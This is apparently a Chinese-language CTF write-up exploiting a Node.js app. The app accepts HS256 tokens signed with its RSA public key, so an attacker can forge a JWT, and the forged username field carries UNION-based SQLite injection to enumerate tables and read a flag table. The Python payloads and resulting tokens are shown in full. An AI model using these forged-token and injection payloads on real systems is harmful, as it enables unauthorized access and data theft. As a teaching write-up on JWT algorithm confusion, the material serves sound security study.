## 分析

在`JWTHelper.js`中，在验证`cookie`的时候可以使用`HS256`来验证，并且使用的是公钥来作为`secret`
```javascript
async decode(token) {
        return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
    }
```

那么我们可以先注册一个账号，然后解码`JWT`来获得公钥，再利用公钥来签发任意用户名的`JWT`

在访问主页的时候，会尝试去解码`JWT`，在数据库中查找是否存在这个用户，所以造成了`SQL`注入

```javascript
getUser(username){
        return new Promise((res, rej) => {
            db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
```

`payload`如下：

```python
>>> jwt.encode({"username":"admin' union select 1,2,3;"}, pk, algorithm='HS256')
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyB1bmlvbiBzZWxlY3QgMSwyLDM7In0.Mk2XRXk4NWjCA4AnKdds2yOivt_2WjvxhU6L5dF7nyE'

>>> jwt.encode({"username":"admin' union select 1,sql,3 from sqlite_schema limit 1 offset 0;"}, pk, algorithm='HS256')
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyB1bmlvbiBzZWxlY3QgMSxzcWwsMyBmcm9tIHNxbGl0ZV9zY2hlbWEgbGltaXQgMSBvZmZzZXQgMDsifQ.4HmeW4sRkZDoVXfVPP3oRfvOByabBA2zxGZYlWF-3jY'

>>> jwt.encode({"username":"admin' union select 1,tbl_name,3 from sqlite_master where type='table' and tbl_name not like 'sqlite_%';"}, pk, algorithm='HS256')
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyB1bmlvbiBzZWxlY3QgMSx0YmxfbmFtZSwzIGZyb20gc3FsaXRlX21hc3RlciB3aGVyZSB0eXBlPSd0YWJsZScgYW5kIHRibF9uYW1lIG5vdCBsaWtlICdzcWxpdGVfJSc7In0._lQG5vHI5YDUH154uCqMHTIJHVKJKBg-dazXNAnA3Yo'

>>> jwt.encode({"username":"admin' union select 1,sql,3 from sqlite_master where type!='meta' and sql not null and name='flag_storage';"}, pk, algorithm='HS256')
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyB1bmlvbiBzZWxlY3QgMSxzcWwsMyBmcm9tIHNxbGl0ZV9tYXN0ZXIgd2hlcmUgdHlwZSE9J21ldGEnIGFuZCBzcWwgbm90IG51bGwgYW5kIG5hbWU9J2ZsYWdfc3RvcmFnZSc7In0.e_cpaorEWn7G9TIFvF8nfpmZmWbNTg4CnVmavHqmgDg'

>>> jwt.encode({"username":"admin' union select 1,top_secret_flaag,3 from flag_storage;"}, pk, algorithm='HS256')
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyB1bmlvbiBzZWxlY3QgMSx0b3Bfc2VjcmV0X2ZsYWFnLDMgZnJvbSBmbGFnX3N0b3JhZ2U7In0.g_RkxEfCAkhfX7BuZhH9K7_HgXcpYy4rBOBxNbJvJMQ'
```